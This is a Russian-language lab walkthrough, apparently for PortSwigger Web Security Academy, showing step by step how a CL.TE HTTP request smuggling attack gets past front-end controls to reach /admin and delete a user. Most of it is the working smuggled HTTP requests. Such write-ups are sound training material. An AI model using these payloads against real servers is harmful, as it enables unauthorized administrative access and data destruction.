Перейдем на уязвимый ресурс, и пропустим эти шаги, по выявлению, что тут CL.TE архитектура фронта и бэка 
сразу воспримем это как факт

чтобы достучаться до директории `/admin` перейдем
```
POST / HTTP/1.1
Host: 0aae004b04e9dd0f8084ee9800a60022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/6.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability/pics%20for%20walkthrough/1.png)

и второй запрос который посылаем вдогонку 
```
POST / HTTP/1.1
Host: 0aae004b04e9dd0f8084ee9800a60022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
выдаем нам 
`HTTP/1.1 401` и говорит, что нам надо быть локальными пользователями
окей, будем
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/6.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability/pics%20for%20walkthrough/2.png)
добавим `Host: localhost` во второй запрос, и изменим длину запроса в первом

```
POST / HTTP/1.1
Host: 0aae004b04e9dd0f8084ee9800a60022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/6.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability/pics%20for%20walkthrough/3.png)

и при отправке второго запроса получаем ошибку
`error":"Duplicate header names are not allowed"`


Это все получается из-за того, что запросы накладываются, и когда мы отправляем, получается следующее
```
POST / HTTP/1.1
Host: 0aae004b04e9dd0f8084ee9800a60022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: XPOST / HTTP/1.1
Host: 0aae004b04e9dd0f8084ee9800a60022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и получается 2 `Host` сразу
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/6.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability/pics%20for%20walkthrough/4.png)

далее, чтобы обойти это, добавим во вторую часть первого запроса `x=`


и получим 
```
POST / HTTP/1.1
Host: 0aae004b04e9dd0f8084ee9800a60022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```


`после x= переноса строки нет! это важно!`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/6.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability/pics%20for%20walkthrough/5.png)
отправим второй обычный запрос, и увидим что у нас отрисовалась админская панель, и перейдя в код увидим, что удалить карлоса можно через путь `/admin/delete?username=carlos`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/6.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability/pics%20for%20walkthrough/6.png)
Изменим изначальный запрос на 
```
POST / HTTP/1.1
Host: 0aae004b04e9dd0f8084ee9800a60022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Transfer-encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/6.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability/pics%20for%20walkthrough/7.png)

и после отправки второго запроса получим уведомление об успешено выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/6.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability/pics%20for%20walkthrough/8.png)
